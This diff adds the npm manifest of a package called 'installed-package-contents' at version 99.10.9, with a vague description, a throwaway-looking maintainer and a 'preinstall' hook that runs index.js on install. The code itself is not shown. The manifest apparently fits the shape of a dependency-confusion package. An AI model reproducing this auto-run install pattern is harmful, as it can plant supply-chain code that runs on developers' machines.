@@ -1,0 +1,39 @@
+{
+    "name": "installed-package-contents",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "installed-package-contents@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-4g/+tlUko03ENkH1/PQcylXNRK3/8ZRC8NjgnyLxRy52tRILtxT3mLEBwCnkqA/dlMiJhSEEGcjha9Ey970eaw==",
+        "shasum": "b078143dc6ebc068bcd6fbe22d65bf280492cf0a",
+        "tarball": "https://registry.npmjs.org/installed-package-contents/-/installed-package-contents-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5078,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPLAwACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoZYQ//ZpXpL0LYPZJukJeeRain0InYZwSnl7s2J8xvUGLUF8qcbaAW\r\nMYytYYKEpHQQJ284pyThDPCYys3p+NFrIxxMy9A+DrKKCbeW0K481JD+0bqt\r\n47U8hgm5sVb9WA8jyiXwZ/mv1I11KHsjTjBybmcqZ6TNZb/6N9wH5gVkUEvJ\r\ncH4fsYyQFJJrDGvUTs7QzTaxnVkv6t8uqzPXQ9ZqAiZNBzE0qULRolO7y1aR\r\ntvfL0YbqGdPgC4rw09M/3LWUMIvAZbNtdm+Kg265nsLjimBhEsffVyYSw+mM\r\nlhO9NMrZPzqUlaVBdfyRp8A2tObdOKQ1UhsMVqccslNb/uMz2TvbQeSNRCq2\r\nvKIAf5QYOODqTKQPfdrSEf4pJRIj5n7kQGh0gNxJVoj8ZmPAUZ0HoYUfwj3g\r\nibksv4q/uTXRrwPLAbQ1al3cxXL6qGLwFD9o2GWj5Yq3FXVfOCR4iVfQLPkc\r\niNY5eYukE9kUKliP7Neau4nNNRNovR012HsH0OoBikteqXcFGf2+ZqVlMkmH\r\nwW8C+l27y+1srD+tIoEjaiVseyEGBsYnw6b3TclPlNsg8A3OWml9ZNC52VhV\r\nGp0qaqfXnPnrJV2sMmqrM26GBdus4eOSe2IXl37jkcY8Fiipb+GZz9pfVA+H\r\nqofhv9A6oLt7k1cFQH9V3pMfRYsPhiqvBBY=\r\n=O88l\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "645x75kw",
+        "email": "645x75kw@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "645x75kw",
+            "email": "645x75kw@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/installed-package-contents_99.10.9_1648144432397_0.20200005642551422"
+    },
+    "_hasShrinkwrap": false
+}
